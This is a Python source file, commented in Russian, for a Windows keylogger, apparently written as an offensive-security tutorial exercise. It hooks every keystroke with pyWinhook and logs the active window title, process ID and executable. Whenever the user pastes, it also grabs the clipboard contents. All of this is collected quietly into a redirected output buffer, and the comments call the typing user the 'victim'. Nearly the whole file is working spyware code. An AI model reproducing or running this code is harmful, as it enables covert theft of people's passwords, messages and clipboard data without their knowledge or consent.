from ctypes import byref, create_string_buffer, c_ulong, windll, create_unicode_buffer
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard
import win32api
import pygetwindow as gw

TIMEOUT = 60 # * 10

keyboard_layout_mapping = {
    'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з',
    '[': 'х', ']': 'ъ', 'a': 'ф', 's': 'ы', 'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л',
    'l': 'д', ';': 'ж', "'": 'э', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и', 'n': 'т', 'm': 'ь',
    ',': 'б', '.': 'ю', '/': '.', 'Q': 'Й', 'W': 'Ц', 'E': 'У', 'R': 'К', 'T': 'Е', 'Y': 'Н', 'U': 'Г',
    'I': 'Ш', 'O': 'Щ', 'P': 'З', '{': 'Х', '}': 'Ъ', 'A': 'Ф', 'S': 'Ы', 'D': 'В', 'F': 'А', 'G': 'П',
    'H': 'Р', 'J': 'О', 'K': 'Л', 'L': 'Д', ':': 'Ж', '"': 'Э', 'Z': 'Я', 'X': 'Ч', 'C': 'С', 'V': 'М',
    'B': 'И', 'N': 'Т', 'M': 'Ь', '<': 'Б', '>': 'Ю', '?': ','
}

# Функция для перевода текста с английской на русскую раскладку и наоборот
# def translate_keyboard_layout(text, mapping):
#     translated_text = ""
#     for char in text:
#         if char in mapping:
#             translated_text += mapping[char]
#         else:
#             translated_text += char
#     return translated_text


# translated_english_to_russian = translate_keyboard_layout(chr(event.Ascii), keyboard_layout_mapping)


class KeyLogger:
    def __init__(self):
        self.current_window = None  # Эта переменная будет использоваться для отслеживания активного окна в системе.

    def get_current_process(self):
        """метод get_current_process будет захватывать активное окно вместе с его ID"""
        hwnd = windll.user32.GetForegroundWindow()  # GetForeGroundWindow возвращает дескриптор активного окна на рабочем столе жертвы
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))  #  передаем дескриптор hwnd функции GetWindowThreadProcessId, чтобы получить ID процесса, которому принадлежит окно.
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)  # создание буфера executable длиной в 512 байт, который будет использоваться для хранения информации о пути к исполняемому файлу процесса.
        h_proccess = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        """Этот код открывает процесс по его идентификатору (PID):
        windll.kernel32.OpenProcess - это вызов функции Windows API для открытия процесса. 
        0x400 | 0x10 - это флаги доступа к процессу. 0x400 означает PROCESS_QUERY_INFORMATION, а 0x10 означает PROCESS_VM_READ. 
        Эти флаги позволяют получать информацию о процессе и читать его память.
        False - процесс не должен быть унаследован.
        pid - это идентификатор процесса."""
        windll.psapi.GetModuleBaseNameA(h_proccess, None, byref(executable), 512)
        """windll.psapi.GetModuleBaseNameA - это вызов функции Windows API для получения имени модуля (исполняемого файла) процесса.
        h_proccess - это дескриптор открытого процесса.
        None - информация о модуле будет получена для главного исполняемого файла процесса.
        byref(executable) - это буфер executable, в который будет записан путь к исполняемому файлу.
        512 - это максимальная длина пути, которую можно получить."""
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)  # получения текста заголовка окна, которое связано с указанным дескриптором окна hwnd
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        print('\n', process_id, executable.value.decode(), self.current_window)
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_proccess)

    def mykeystroke(self, event):
        """ выбрал ли пользователь новое окно, и если да, то получаем название нового окна и информацию о процессе."""
        if event.WindowName != self.current_window:
            self.get_current_process()
        """анализируем нажатую клавишу и, если она находится в печатном диапазоне ASCII, выводим ее."""
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            """ Если это модификатор (такой как Shift, Ctrl или Alt) или любая нестандартная клавиша, извлекаем ее
                название из объекта события. А также проверяем, выполняет ли пользователь операцию вставки, и если
                да, выводим содержимое буфера обмена."""
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True  # В завершение функция обратного вызова возвращает True, чтобы позволить следующему хуку в цепочке (если таковой имеется) обработать событие.


def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()  # перенаправим поток stdout в объект-дескриптор StringIO. В результате все, что будет
                              # записано в stdout, попадет в этот объект

    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke  # Дальше привязываем событие KeyDown к обратному вызову mykeystroke, который
                                 # принадлежит классу KeyLogger.
    """ просим PyWinHook перехватывать все нажатия клавиш и продолжаем выполнение, пока не истечет время ожидания. 
    Каждый раз, когда жертва нажимает клавишу на клавиатуре, вызывается наш метод mykeystroke с объектом события и его параметром."""
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()  # Этот вызов PumpWaitingMessages используется для обработки ожидающих сообщений в многозадачных приложениях Windows и может применяться, когда приложение ожидает каких-либо системных событий или сообщений.
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log


if __name__ == "__main__":
    print(run())
    print('done.')